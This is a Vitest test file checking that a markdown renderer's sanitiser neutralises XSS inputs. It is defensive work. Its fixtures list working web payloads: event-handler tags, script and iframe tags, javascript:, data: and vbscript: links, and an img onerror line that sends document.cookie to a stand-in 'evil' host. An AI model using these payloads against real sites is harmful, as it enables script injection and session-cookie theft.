import { describe, expect, it } from "vitest";
import { renderMarkdownSafe } from "../markdown";

// Assert the ABSENCE of the executable part, never exact entity spelling: escaping is marked's to choose.
const EXECUTABLE = [
  ["block img handler", `<img src=x onerror="fetch('https://evil/'+document.cookie)">`],
  ["inline img handler", `a row that says <img src=x onerror=alert(1)> mid-sentence`],
  ["svg onload", `<svg onload=alert(1)>`],
  ["script element", `<script>alert(1)</script>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>">`],
  ["body onload via tag", `<body onload=alert(1)>`],
  ["anchor with js scheme", `<a href="javascript:alert(1)">click</a>`],
  ["details ontoggle", `<details open ontoggle=alert(1)>x</details>`],
] as const;

describe("renderMarkdownSafe", () => {
  it.each(EXECUTABLE)("neutralises %s", (_name, payload) => {
    const html = renderMarkdownSafe(payload);
    // `onerror=` may survive as escaped TEXT: an attribute outside a tag cannot execute.
    expect(html).not.toMatch(/<\s*(script|img|svg|iframe|body|details|a\s)/i);
    expect(html).not.toContain("<script");
  });

  it.each([
    ["javascript link", "[click](javascript:alert(1))"],
    ["javascript link, mixed case and tab", "[click](JavaScript\t:alert(1))"],
    ["javascript reference link", "[click][r]\n\n[r]: javascript:alert(1)"],
    ["entity-spelled colon", "[click](javascript&#58;alert(1))"],
    ["data link", "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"],
    ["vbscript link", "[click](vbscript:msgbox(1))"],
  ])("renders a %s as its text alone", (_name, payload) => {
    const html = renderMarkdownSafe(payload);
    expect(html).not.toMatch(/<a\s/i);
    expect(html).toContain("click");
  });

  it.each([
    ["remote image", "![beacon](https://evil/?x)"],
    ["relative image", "![beacon](/api/v1/x)"],
  ])("renders a %s as its alt text, requesting nothing", (_name, payload) => {
    const html = renderMarkdownSafe(payload);
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toContain("evil");
    expect(html).toContain("beacon");
  });

  it("keeps http, https, mailto and relative links", () => {
    for (const href of ["https://example.org/a", "http://example.org", "mailto:a@b.c", "rounds/round_0001.json", "#top"]) {
      expect(renderMarkdownSafe(`[x](${href})`)).toMatch(/<a href="/);
    }
  });

  it("still renders the markdown the viewer exists to show", () => {
    const html = renderMarkdownSafe(
      ["# Round 2", "", "- improved: **yes**", "", "`composite_fitness`", "", "| a | b |", "| - | - |", "| 1 | 2 |"].join("\n"),
    );
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>yes</strong>");
    expect(html).toContain("<code>composite_fitness</code>");
    expect(html).toContain("<table");
  });

  it("keeps code fences readable rather than entity-noisy", () => {
    const html = renderMarkdownSafe(["```", "<div>literal</div>", "```"].join("\n"));
    expect(html).toContain("&lt;div&gt;literal&lt;/div&gt;");
    expect(html).not.toContain("&amp;lt;");
  });
});
